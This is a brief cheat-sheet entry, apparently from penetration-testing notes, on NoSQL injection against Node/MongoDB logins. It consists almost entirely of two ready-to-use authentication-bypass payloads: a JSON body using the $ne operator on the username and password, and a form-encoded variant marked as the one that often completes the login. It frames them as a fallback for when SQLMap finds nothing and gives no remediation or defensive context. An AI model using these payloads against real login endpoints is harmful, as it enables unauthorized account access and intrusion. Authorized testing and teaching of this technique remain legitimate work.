# NoSQL Injection

Auth bypass via Mongo operator injection — try this when SQLMap finds nothing on a Node/Mongo stack.

```bash
# JSON body
{"username":{"$ne":null},"password":{"$ne":null}}

# form-encoded (often the one that actually completes the login)
username=<USER>&password[$ne]=asdf
```

